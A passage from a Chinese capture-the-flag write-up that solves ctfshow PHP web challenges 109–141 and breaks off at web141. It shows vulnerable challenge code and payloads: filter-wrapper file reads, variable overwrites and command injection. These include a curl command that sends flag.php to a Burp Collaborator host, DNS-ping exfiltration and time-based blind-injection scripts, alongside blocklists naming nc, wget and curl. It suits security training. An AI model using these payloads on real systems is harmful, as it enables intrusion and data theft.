<p>字符串逆序，0x36d十进制为877，逆序即为778</p>
<p>故可以构建payload</p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505215746759.png" alt="image-20220505215746759"></p>
<p>当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过<code>echo</code>显示<br>即使传入了空的括号，代码依旧可以运行，且<code>error_reporting(0)</code>的存在阻止了报错</p>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
    $v1 &#x3D; $_GET[&#39;v1&#39;];
    $v2 &#x3D; $_GET[&#39;v2&#39;];

    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;
            die(&quot;error v1&quot;);
    &#125;
    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;
            die(&quot;error v2&quot;);
    &#125;

    eval(&quot;echo new $v1($v2());&quot;);

&#125;</code></pre>

<p>利用原生类FilesystemIterator配合getcwd来读文件目录，然后直接访问就行了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180313118.png" alt="image-20220506180313118"></p>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

function getFlag(&amp;$v1,&amp;$v2)&#123;
    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);
    var_dump($$v1);
&#125;


if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
    $v1 &#x3D; $_GET[&#39;v1&#39;];
    $v2 &#x3D; $_GET[&#39;v2&#39;];

    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;
            die(&quot;error v1&quot;);
    &#125;
    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;
            die(&quot;error v2&quot;);
    &#125;
    
    if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;
            getFlag($v1,$v2);
    &#125;
&#125;</code></pre>

<p>利用变量覆盖让$ctfshow=全局变量</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180100307.png" alt="image-20220506180100307"></p>
<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;
        die(&quot;hacker!&quot;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
&#125;</code></pre>

<p>filter协议直接读，或者用一些没被过滤的编码</p>
<pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php
php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php
php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php
compress.zlib:&#x2F;&#x2F;flag.php</code></pre>





<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
        die(&#39;hacker!&#39;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
</code></pre>

<p>filter被禁了，可以换一个</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506174743375.png" alt="image-20220506174743375"></p>
<p>或这利用多次重复绕过is_file的判断</p>
<p>linux里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容</p>
<pre class="language-php" data-language="php"><code class="language-php">payload：
?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre>

<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180821666.png" alt="image-20220506180821666"></p>
<p>不带编码的filter</p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="language-php" data-language="php"><code class="language-php">include(&#39;flag.php&#39;);
highlight_file(__FILE__);
error_reporting(0);
function filter($num)&#123;
    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);
    return $num;
&#125;
$num&#x3D;$_GET[&#39;num&#39;];
if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;
    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;
        echo $flag;
    &#125;else&#123;
        echo &quot;hacker!!&quot;;
    &#125;
&#125;else&#123;
    echo &quot;hacker!!!&quot;;
&#125;</code></pre>

<p>在不影响数字类型的前提下能加的字符除了数字和+-.号以外还有 %09 %0a %0b %0c %0d %20，trim过滤了 %09 %0a %0b %0d %20，所以只剩下%0c换页符了</p>
<p>payload：</p>
<p>num=%0c36</p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);  
         if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;</code></pre>

<p>PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_</p>
<p>所以我们没有办法post CTF_SHOW.COM进去</p>
<p>这里就用到了php变量名特性绕过</p>
<p>在变量名中出现了[的话，在get、post传参中，[就会被替换成_，然后其后的字母不会发生变化，CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
<p>然后直接输出flag变量</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183011845.png" alt="image-20220506183011845"></p>
<p>再来几个其他的</p>
<p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=var_export($GLOBALS)读取全局变量</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183352375.png" alt="image-20220506183352375"></p>
<pre class="language-php" data-language="php"><code class="language-php">payload:
get:  $fl0g&#x3D;flag_give_me;
post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</code></pre>

<p>这种就是在eval里执行这个赋值语句$fl0g=flag_give_me;就能满足后边的判断输出flag</p>
<p>下面这个是预期解</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183835525.png" alt="image-20220506183835525"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506184715179.png" alt="image-20220506184715179"></p>
<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print&#x2F;i&quot;, $c)&amp;&amp;$c&lt;&#x3D;16)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);
         if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;
?&gt;</code></pre>

<p>可以用123的预期解</p>
<p>或者包含一下</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506185355334.png" alt="image-20220506185355334"></p>
<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d&#x2F;i&quot;, $c) &amp;&amp; strlen($c)&lt;&#x3D;16)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);  
         if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;</code></pre>

<p>123的预期解还是能用，或者是</p>
<pre class="language-php" data-language="php"><code class="language-php">?$fl0g&#x3D;flag_give_me
POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])&#x2F;&#x2F;就是用assert替换eval</code></pre>

<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
$ctf_show &#x3D; md5($flag);
$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];


&#x2F;&#x2F;特殊字符检测
function waf($url)&#123;
    if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;

if(waf($url))&#123;
    die(&quot;嗯哼？&quot;);
&#125;else&#123;
    extract($_GET);
&#125;


if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;
    echo $flag;</code></pre>

<p>下划线被过滤了，可以用空格代替</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?ctf show&#x3D;ilove36d</code></pre>

<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p> _()是一个函数</p>
<p>_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p>
<p>当php开启了gettext扩展后，可以绕过字母</p>
<pre class="language-none"><code class="language-none">echo gettext(phpinfo());&#x3D;&#x3D;&#x3D;echo _(phpinfo());</code></pre>

<p><strong>get_defined_vars()</strong></p>
<p>get_defined_vars — 返回由所有已定义变量所组成的数组</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506200639084.png" alt="image-20220506200639084"></p>
<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><pre class="language-php" data-language="php"><code class="language-php">f&#x3D;..&#x2F;ctfshow&#x2F;..&#x2F;html&#x2F;flag.php</code></pre>

<p>目录穿越</p>
<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;f&#39;]))&#123;
    $f &#x3D; $_POST[&#39;f&#39;];

    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;
        die(&#39;bye!&#39;);
    &#125;
    if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;
        die(&#39;bye!!&#39;);
    &#125;
    echo $flag;
&#125;</code></pre>

<p>利用preg_match的回溯限制，如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p>
<p>也可以用数组绕过</p>
<p>第二个正则匹配是强等于，类型必须相同</p>
<p>采用<code>数组</code>绕过的方法，<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p>
<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>跟web132差不多，就是不知道为什么不能数组绕过，只能利用最大回溯了</p>
<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><pre class="language-php" data-language="php"><code class="language-php">
if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123;
    $username &#x3D; (String)$_GET[&#39;username&#39;];
    $password &#x3D; (String)$_GET[&#39;password&#39;];
    $code &#x3D; (String)$_GET[&#39;code&#39;];

    if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;
        
        if($code &#x3D;&#x3D; &#39;admin&#39;)&#123;
            echo $flag;
        &#125;
        
    &#125;
&#125;</code></pre>

<p>让if为真只要让username=admin就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506203341551.png"></p>
<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
&#x2F;&#x2F;flag.php
if($F &#x3D; @$_GET[&#39;F&#39;])&#123;
    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123;
        eval(substr($F,0,6));
    &#125;else&#123;
        die(&quot;6个字母都还不够呀?!&quot;);
    &#125;
&#125;</code></pre>

<pre class="language-txt" data-language="txt"><code class="language-txt">get传参   F&#x3D;&#96;$F &#96;;sleep 3
经过substr($F,0,6)截取后 得到  &#96;$F &#96;;
也就是会执行 eval(&quot;&#96;$F &#96;;&quot;);
我们把原来的$F带进去
eval(&quot;&#96;&#96;$F &#96;;sleep 3&#96;&quot;);
也就是说最终会执行  &#96;&#96;$F &#96;;sleep 3&#96; &#x3D;&#x3D; shell_exec(&quot;&#96;$F &#96;;sleep 3&quot;);
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3</code></pre>

<p>然后因为没有回显，可以通过curl外带来查看<br>这里可以用bp也可以用vps<br>curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205540822.png" alt="image-20220506205540822"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205559475.png" alt="image-20220506205559475"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205834293.png" alt="image-20220506205834293"></p>
<pre class="language-none"><code class="language-none">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php  http:&#x2F;&#x2F;8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
#其中-F 为带文件的形式发送post请求
#xx是上传文件的name值，flag.php就是上传的文件 </code></pre>

<p>还可以利用cp命令将flag.php里的内容复制到一个txt内，然后直接访问</p>
<pre class="language-none"><code class="language-none">&#96;$F&#96; ;cp flag.php 1234.txt</code></pre>

<p>还可以dnslog外带</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507181310310.png" alt="image-20220507181310310"></p>
<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
$key1 &#x3D; 0;
$key2 &#x3D; 0;
if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123;
    die(&quot;nonononono&quot;);
&#125;
@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);
extract($_POST);
if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123;
    die(file_get_contents(&#39;flag.php&#39;));
&#125;</code></pre>

<p>不能传入key1，key2，可以利用extract的变量覆盖绕过</p>
<p>$_SERVER[‘QUERY_STRING’]<br>获取查询语句，实例中可知，获取的是?后面的值，只有get请求</p>
<p>extract()<br>该函数是将数组中的值依次复制给$键=值</p>
<p>parse_string()<br>将字符串解析到变量中</p>
<p>如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
<p>payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</code></pre>

<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">error_reporting(0);
highlight_file(__FILE__);
&#x2F;&#x2F;flag.php
if($F &#x3D; @$_GET[&#39;F&#39;])&#123;
    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123;
        eval(substr($F,0,6));
    &#125;else&#123;
        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);
    &#125;
&#125;</code></pre>

<ul>
<li>nl，cat，tac，more，less，tail等都可以读文件</li>
<li>awk加上NR参数可以读取指定行数，记得加引号</li>
<li>tr -cd 后面可以加正则表达式</li>
</ul>
<p>用ping的话建议用dnslog.cn别用ceye.io，因为ceye给的域名在ping的时候会显示找不到主机，没法成功ping</p>
<p>而且只要这个payload才能成功</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">F&#x3D;&#96;$F&#96;; ping &#96;nl flag.php|awk &#39;&#x2F;flag&#x2F;&#39;| tr -cd &quot;[a-z]&quot;&#x2F;&quot;[0-9]&quot;&#96;.klj10h.dnslog.cn -c 1</code></pre>

<p>这里直接nl带不出来可能是因为内容太多了，但是awk后边的flag换成ctfshow也出不了我不太清楚为什么</p>
<p>可以用下边这个命令查看目录</p>
<pre class="language-sh" data-language="sh"><code class="language-sh">printf &#39;%s&#39; *</code></pre>

<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
function check($x)&#123;
    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;
        die(&#39;too young too simple sometimes naive!&#39;);
    &#125;
&#125;
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    check($c);
    exec($c);
&#125;
else&#123;
    highlight_file(__FILE__);
&#125; </code></pre>

<p>exec无回显</p>
<p>要尝试将命令的结果输入到一个文件中</p>
<p>在没有&gt;的前提下可以利用tee命令</p>
<p>tee file //覆盖</p>
<p>tee -a file //追加</p>
<p>tee - //输出到标准输出两次</p>
<p>tee --//输出到标准输出三次</p>
<p>tee file1 file2 // 输出到标准输出两次，并写到那两个文件中</p>
<p>ls | tee file</p>
<p>所以payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">ls &#x2F;|tee a
nl &#x2F;f149_15_h3r3|tee a</code></pre>

<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&#123;
    function __wakeup()&#123;
        die(&quot;private class&quot;);
    &#125;
    static function getFlag()&#123;
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;

call_user_func($_POST[&#39;ctfshow&#39;]);</code></pre>

<p>考察调用类中的函数<br>双冒号可以不用实例化类就可以直接调用类中的方法</p>
<pre class="language-php" data-language="php"><code class="language-php">ctfshow&#x3D;ctfshow::getFlag</code></pre>

<pre class="language-txt" data-language="txt"><code class="language-txt">php中 -&gt;与:: 调用类中的成员的区别
-&gt;用于动态语境处理某个类的某个实例
::可以调用一个静态的、不依赖于其他初始化的类方法.</code></pre>

<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&#123;
    function __wakeup()&#123;
        die(&quot;private class&quot;);
    &#125;
    static function getFlag()&#123;
        echo file_get_contents(&quot;flag.php&quot;);
    &#125;
&#125;

if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123;
    die(&quot;private function&quot;);
&#125;

call_user_func($_POST[&#39;ctfshow&#39;]); 
</code></pre>

<p>call_user_func()可以传数组</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507210208231.png" alt="image-20220507210208231"></p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag</code></pre>

<h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
function check($x)&#123;
    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;
        die(&#39;too young too simple sometimes naive!&#39;);
    &#125;
&#125;
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    check($c);
    exec($c);
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>

<p>虽然看起来和136差不多，但是没了写文件的权限</p>
<p>盲打看起来有些离谱</p>
<p>放一下脚本吧就(不实践了，跑脚本也不需要啥技术</p>
<p>获取文件名的脚本：</p>
<pre class="language-php" data-language="php"><code class="language-php">import requests
import time
import string
str&#x3D;string.ascii_letters+string.digits	#生成所有字母与数字[a-zA-Z0-9]
result&#x3D;&quot;&quot;
for i in range(1,5):
	key&#x3D;0
	for j in range(1,15):
		if key&#x3D;&#x3D;1:
			break
		for n in str:
			payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)
			#print(payload)
			url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payload
			try:
				requests.get(url,timeout&#x3D;(2.5,2.5))
			except:
			    result&#x3D;result+n
			    print(result)
			    break
			if n&#x3D;&#x3D;&#39;9&#39;:
				key&#x3D;1
	result+&#x3D;&quot; &quot;
</code></pre>

<p>猜解文件内容的脚本：</p>
<pre class="language-none"><code class="language-none">import requests
import time
import string
str&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字
result&#x3D;&quot;&quot;
key&#x3D;0
for j in range(1,45):
	print(j)
	if key&#x3D;&#x3D;1:
		break
	for n in str:
		payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)
		#print(payload)
		url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payload
		try:
			requests.get(url,timeout&#x3D;(2.5,2.5))	#time()第一个参数是响应时间，第二个是读取时间
		except:
		    result&#x3D;result+n
		    print(result)
		    break</code></pre>

<p>一些分析</p>
<pre class="language-php" data-language="php"><code class="language-php">用awk命令、cut命令截取字符
sleep命令确认是否正确

awk NR&#x3D;&#x3D;2 获取第二行信息
cut -c 1  截取第1个字符

zsh下if语句的格式：
 if [[condition]] &#123;command
&#125; elif &#123;
&#125; else &#123;
&#125;</code></pre>

<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;
    $f1 &#x3D; (String)$_POST[&#39;f1&#39;];
    $f2 &#x3D; (String)$_POST[&#39;f2&#39;];
    if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123;
        if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123;
            $code &#x3D; eval(&quot;return $f1($f2());&quot;);
            if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123;
                echo file_get_contents(&quot;flag.php&quot;);
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>

<p>php的弱比较</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/1e0d551aaf224921bcf46924b3652619.png" alt="在这里插入图片描述"></p>
<p>intval会将非数字字符转换为0</p>
<p>而0==“字符串”为真</p>
<p>所以只要让等号右边的玩意是字符串就行了</p>
<pre class="language-php" data-language="php"><code class="language-php">md5(phpinfo())
md5(sleep())
md5(md5())
current(localeconv)
sha1(getcwd())     因为&#x2F;var&#x2F;www&#x2F;html md5后开头的数字所以我们改用sha1</code></pre>

<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><pre class="language-php" data-language="php"><code class="language-php">#error_reporting(0);
